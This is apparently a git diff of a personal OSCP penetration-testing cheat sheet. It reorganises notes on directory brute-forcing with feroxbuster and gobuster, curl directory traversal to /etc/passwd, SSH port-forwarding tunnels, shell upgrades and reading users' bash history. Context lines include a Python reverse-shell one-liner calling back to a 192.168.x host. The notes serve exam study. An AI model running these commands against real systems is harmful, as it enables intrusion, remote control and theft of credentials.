@@ -45,9 +45,33 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.175\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'
 ```
 
-# SSH
+## Tools
+### feroxbuster 
+```bash
+feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.222.62/ -C 404,401,403,502,500 -x php,html,txt,jsp,asp,aspx,sh,conf,pl,bak,zip,gz,js,config
+feroxbuster -u http://192.168.209.153:8000/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php,html,txt,jsp,asp,aspx,sh,conf,pl,bak,zip,gz,js,config -t 200
+```
 
+### gobuster
+```bash
+gobuster dir -u http://<% tp.frontmatter["RHOST"] %>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+```
+
+### curl
+![image](https://github.com/nuricheun/OSCP/assets/14031269/83b00a36-8468-4e38-a5c9-3cf2eb68cbbd)
+```bash
+# -v : When the web page looks like above, use -v for debugging and getting extra information about the response from server
+We can find the stack information as well(ex. saltstack)
+curl -v target:port
+
+# directory traversal
+curl --path-as-is http://192.168.x.x/../../../../../../etc/passwd
+```
+
+# SSH
 ## SSH Keygen
+- See if other users can login as root using ssh key
 
 ```bash
 # Generate ssh key:
@@ -58,6 +82,24 @@ ssh -i id_rsa root@192.168.x.x
 
 # To handle "Received disconnect from 127.0.0.1 port 22:2: Too many authentication failures" error:
 ssh -i id_rsa root@192.168.x.x -o IdentitiesOnly=yes
+```
+
+## SSH Tennling
+```bash
+# Local port forwarding
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
+
+# Local dynamic port forwarding
+ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
+
+# Remote port forwarding
+sudo systemctl start ssh
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
+
+# Remote dynamic port forwarding
+ssh -N -R 9998 kali@192.168.118.4
 
 ```
 
@@ -66,24 +108,21 @@ ssh -i id_rsa root@192.168.x.x -o IdentitiesOnly=yes
 
 ## input form
 - Input form: check with burpsuite
-  - SQLi
-  - Check to see if we can modify post data
-  - 
+- SQLi
+- Check to see if we can modify post data
 
-## feroxbuster 
-```bash
-feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.222.62/ -C 404,401,403,502,500 -x php,html,txt,jsp,asp,aspx,sh,conf,pl,bak,zip,gz,js,config
-feroxbuster -u http://192.168.209.153:8000/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php,html,txt,jsp,asp,aspx,sh,conf,pl,bak,zip,gz,js,config -t 200
-```
 
-## curl
-![image](https://github.com/nuricheun/OSCP/assets/14031269/83b00a36-8468-4e38-a5c9-3cf2eb68cbbd)
-```bash
-# -v : When the web page looks like above, use -v for debugging and getting extra information about the response from server
-We can find the stack information as well(ex. saltstack)
-curl -v target:port
+## Directory Traversal
+- Make sure to read and try exploit codes' examples
+- Use curl --path-as-is or burp suite
+- Check .ssh directory
+- Check if we can read other vulnerable app's config file through this vulnerability
+- Check other user's home directories to see the name of the files(pg practice cassandra)
+- If wget doesn't work, maybe it only requires very simple way to get through: such as pivot as other users)
 
-```
+
+
+
 
 # Windows Privilege Escalation
 
@@ -210,8 +249,9 @@ Get-Process
 id
 hostname
 
-# User files
-cat .bash_aliases
+# Check User files(Everyone if you can)
+cat /home/user/.bash_aliases
+cat /home/user/.bash_history
 
 # Enumerate other userse
 cat /etc/passwd
